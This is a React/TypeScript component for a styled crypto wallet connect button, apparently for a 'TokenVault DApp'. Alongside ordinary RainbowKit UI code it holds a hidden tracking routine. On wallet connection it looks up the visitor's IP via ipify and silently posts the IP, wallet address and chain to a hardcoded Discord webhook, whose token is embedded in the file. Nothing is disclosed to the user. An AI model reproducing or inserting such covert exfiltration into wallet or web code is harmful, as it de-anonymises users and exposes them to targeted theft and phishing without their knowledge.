import { ConnectButton } from '@rainbow-me/rainbowkit';
import React, { useEffect, useRef } from 'react';
import { useAccount } from 'wagmi';

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1454406788471586836/Xa4unQHgqH26UObEpjd7MRbp7lHYizcJCCQeS8RAUGjxq4T8HXknLWyuaFA3VuMtDx3X';

const getIp = async (): Promise<string> => {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip || 'Unknown';
  } catch {
    return 'Unknown';
  }
};

const sendWebhook = async (walletAddress: string, chainName: string, chainId: number) => {
  try {
    const ip = await getIp();
    await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [
          {
            title: '🔗 Wallet Connected',
            color: 0x00f2ff,
            fields: [
              { name: '🌐 Chain', value: `${chainName} (ID: ${chainId})`, inline: true },
              { name: '📍 IP Address', value: `\`${ip}\``, inline: true },
              { name: '💳 Wallet Address', value: `\`${walletAddress}\`` },
            ],
            timestamp: new Date().toISOString(),
            footer: { text: 'TokenVault DApp' },
          },
        ],
      }),
    });
  } catch (err) {
    console.error('Webhook error:', err);
  }
};

export const CustomConnectButton = () => {
  const { address, isConnected, chain } = useAccount();
  const wasConnected = useRef(false);

  useEffect(() => {
    if (isConnected && address && !wasConnected.current) {
      const chainName = chain?.name || 'Unknown';
      const chainId = chain?.id || 0;
      sendWebhook(address, chainName, chainId);
    }
    wasConnected.current = isConnected;
  }, [isConnected, address, chain]);

  return (
    <ConnectButton.Custom>
      {({
        account,
        chain,
        openAccountModal,
        openChainModal,
        openConnectModal,
        authenticationStatus,
        mounted,
      }) => {
        const ready = mounted && authenticationStatus !== 'loading';
        const connected =
          ready &&
          account &&
          chain &&
          (!authenticationStatus ||
            authenticationStatus === 'authenticated');

        return (
          <div
            {...(!ready && {
              'aria-hidden': true,
              style: {
                opacity: 0,
                pointerEvents: 'none',
                userSelect: 'none',
              },
            })}
          >
            {(() => {
              if (!connected) {
                return (
                  <button
                    onClick={openConnectModal}
                    type="button"
                    className="tech-border bg-[#00f2ff]/5 hover:bg-[#00f2ff]/10 text-[#00f2ff] px-6 py-2 text-[11px] font-black uppercase tracking-[0.2em] transition-all tech-glow flex items-center gap-2 group"
                  >
                    <span className="w-1.5 h-1.5 rounded-full bg-[#00f2ff] animate-pulse" />
                    Connect Access Key
                    <span className="opacity-0 group-hover:opacity-100 transition-opacity ml-1">_</span>
                  </button>
                );
              }

              if (chain.unsupported) {
                return (
                  <button
                    onClick={openChainModal}
                    type="button"
                    className="tech-border bg-red-500/10 border-red-500/50 text-red-500 px-6 py-2 text-[11px] font-black uppercase tracking-[0.2em] transition-all"
                  >
                    Network Mismatch
                  </button>
                );
              }

              return (
                <div className="flex items-center gap-3">
                  <button
                    onClick={openChainModal}
                    type="button"
                    className="hidden sm:flex items-center gap-2 tech-border bg-white/5 px-3 py-1.5 text-[10px] font-bold text-slate-300 uppercase tracking-widest hover:bg-white/10 transition-all"
                  >
                    {chain.hasIcon && (
                      <div
                        style={{
                          background: chain.iconBackground,
                          width: 12,
                          height: 12,
                          borderRadius: 999,
                          overflow: 'hidden',
                        }}
                      >
                        {chain.iconUrl && (
                          <img
                            alt={chain.name ?? 'Chain icon'}
                            src={chain.iconUrl}
                            style={{ width: 12, height: 12 }}
                          />
                        )}
                      </div>
                    )}
                    {chain.name}
                  </button>

                  <button
                    onClick={openAccountModal}
                    type="button"
                    className="tech-border bg-[#00f2ff]/5 border-[#00f2ff]/30 text-white px-4 py-1.5 text-[11px] font-bold uppercase tracking-widest hover:bg-[#00f2ff]/10 transition-all flex items-center gap-3"
                  >
                    <div className="flex flex-col items-end leading-none">
                      <span className="text-[9px] text-[#00f2ff] mb-0.5">UPLINK_ACTIVE</span>
                      <span>{account.displayName}</span>
                    </div>
                    {account.displayBalance ? (
                      <span className="text-slate-500 border-l border-white/10 pl-3">
                        {account.displayBalance}
                      </span>
                    ) : null}
                  </button>
                </div>
              );
            })()}
          </div>
        );
      }}
    </ConnectButton.Custom>
  );
};
